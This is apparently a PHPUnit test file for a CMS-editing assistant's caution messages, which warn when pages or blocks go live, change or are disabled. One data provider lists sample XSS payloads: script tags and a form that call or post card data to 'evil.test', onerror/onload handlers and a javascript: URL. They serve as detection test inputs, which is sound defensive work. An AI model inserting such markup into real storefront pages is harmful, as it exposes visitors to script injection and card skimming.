<?php
/**
 * Copyright © Mago Assistant
 */
declare(strict_types=1);

namespace MagoAssistant\Mago\Test\Unit\Service\Skills\Content\CmsData;

use MagoAssistant\Mago\Service\Skills\Content\CmsData\CmsWriteCautions;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;

class CmsWriteCautionsTest extends TestCase
{
    private const LIVE_PAGE = ['identifier' => 'about-us', 'is_active' => true];
    private const DISABLED_PAGE = ['identifier' => 'about-us', 'is_active' => false];

    #[Test]
    public function aNewEnabledPageSaysItGoesLiveUnfiltered(): void
    {
        $cautions = (new CmsWriteCautions())->forCreate(
            CmsWriteCautions::PAGE,
            ['identifier' => 'sale', 'content' => '<p>Sale</p>'],
            'all store views'
        );

        self::assertCount(1, $cautions);
        self::assertStringContainsString('"sale" goes live right away for every storefront visitor', $cautions[0]);
        self::assertStringContainsString('all store views', $cautions[0]);
        self::assertStringContainsString('does not filter', $cautions[0]);
    }

    #[Test]
    public function aNewDisabledPageWithPlainHtmlNeedsNoCaution(): void
    {
        self::assertSame([], (new CmsWriteCautions())->forCreate(
            CmsWriteCautions::PAGE,
            ['identifier' => 'sale', 'content' => '<p>Sale</p>', 'is_active' => false],
            'all store views'
        ));
    }

    #[Test]
    public function aNewEnabledBlockSaysItShowsWhereverItsIdentifierIsUsed(): void
    {
        $cautions = (new CmsWriteCautions())->forCreate(
            CmsWriteCautions::BLOCK,
            ['identifier' => 'footer_links', 'content' => '<p>Links</p>'],
            'all store views'
        );

        self::assertCount(1, $cautions);
        self::assertStringContainsString('Block "footer_links" is enabled', $cautions[0]);
    }

    /**
     * @return array<string, array{string}>
     */
    public static function activeHtml(): array
    {
        return [
            'script' => ['<p>Hi</p><script>fetch("//evil.test")</script>'],
            'script with space' => ['< script src="//evil.test/x.js"></script>'],
            'event handler' => ['<img src="x" onerror="alert(1)">'],
            'event handler after slash' => ['<svg/onload=alert(1)>'],
            'javascript url' => ['<a href="JavaScript:alert(1)">Win</a>'],
            'iframe' => ['<iframe src="//evil.test"></iframe>'],
            'form' => ['<form action="//evil.test"><input name="card"></form>'],
        ];
    }

    #[Test]
    #[DataProvider('activeHtml')]
    public function contentThatRunsCodeIsCalledOutEvenOnADisabledPage(string $content): void
    {
        $cautions = (new CmsWriteCautions())->forCreate(
            CmsWriteCautions::PAGE,
            ['identifier' => 'sale', 'content' => $content, 'is_active' => false],
            'all store views'
        );

        self::assertCount(1, $cautions);
        self::assertStringContainsString('scripts, frames, forms or event handlers', $cautions[0]);
    }

    #[Test]
    public function wordsThatOnlyLookLikeCodeAreNotCalledOut(): void
    {
        self::assertSame([], (new CmsWriteCautions())->forCreate(
            CmsWriteCautions::PAGE,
            [
                'identifier' => 'faq',
                'content' => '<p>Our online store: description of the scripture, the information form below. '
                    . 'Ordered online = shipped today.</p>',
                'is_active' => false,
            ],
            'all store views'
        ));
    }

    #[Test]
    public function newContentOnALivePageSaysItReplacesWhatVisitorsSee(): void
    {
        $cautions = (new CmsWriteCautions())->forUpdate(
            CmsWriteCautions::PAGE,
            self::LIVE_PAGE,
            ['identifier' => '5', 'content' => '<p>New</p>'],
            null
        );

        self::assertCount(1, $cautions);
        self::assertStringContainsString('Replaces the live content of page "about-us"', $cautions[0]);
    }

    #[Test]
    public function aBlockUpdateSaysItChangesEveryPlaceItIsUsed(): void
    {
        $cautions = (new CmsWriteCautions())->forUpdate(
            CmsWriteCautions::BLOCK,
            ['identifier' => 'footer_links', 'is_active' => true],
            ['identifier' => 'footer_links', 'content' => '<p>Links</p>'],
            null
        );

        self::assertCount(1, $cautions);
        self::assertStringContainsString('live content of block "footer_links"', $cautions[0]);
        self::assertStringContainsString('everywhere the block is used', $cautions[0]);
    }

    #[Test]
    public function aNewTitleOnALivePageIsWhatVisitorsSee(): void
    {
        $cautions = (new CmsWriteCautions())->forUpdate(
            CmsWriteCautions::PAGE,
            self::LIVE_PAGE,
            ['identifier' => '5', 'title' => 'About'],
            null
        );

        self::assertCount(1, $cautions);
        self::assertStringContainsString('Replaces the live title of page "about-us"', $cautions[0]);
    }

    #[Test]
    public function aBlocksTitleIsOnlyShownInTheAdmin(): void
    {
        self::assertSame([], (new CmsWriteCautions())->forUpdate(
            CmsWriteCautions::BLOCK,
            ['identifier' => 'footer_links', 'is_active' => true],
            ['identifier' => 'footer_links', 'title' => 'Footer'],
            null
        ));
    }

    #[Test]
    public function editingADisabledPageThatStaysDisabledNeedsNoCaution(): void
    {
        self::assertSame([], (new CmsWriteCautions())->forUpdate(
            CmsWriteCautions::PAGE,
            self::DISABLED_PAGE,
            ['identifier' => '5', 'content' => '<p>Draft</p>'],
            null
        ));
    }

    #[Test]
    public function enablingADisabledPageSaysItGoesLive(): void
    {
        $cautions = (new CmsWriteCautions())->forUpdate(
            CmsWriteCautions::PAGE,
            self::DISABLED_PAGE,
            ['identifier' => '5', 'is_active' => true],
            true
        );

        self::assertSame(['Enables page "about-us": every visitor sees it on the storefront right away.'], $cautions);
    }

    #[Test]
    public function disablingALivePageSaysVisitorsLoseIt(): void
    {
        $cautions = (new CmsWriteCautions())->forUpdate(
            CmsWriteCautions::PAGE,
            self::LIVE_PAGE,
            ['identifier' => '5', 'is_active' => false],
            false
        );

        self::assertSame(
            ['Takes page "about-us" off the storefront right away: visitors get a "page not found".'],
            $cautions
        );
    }
}
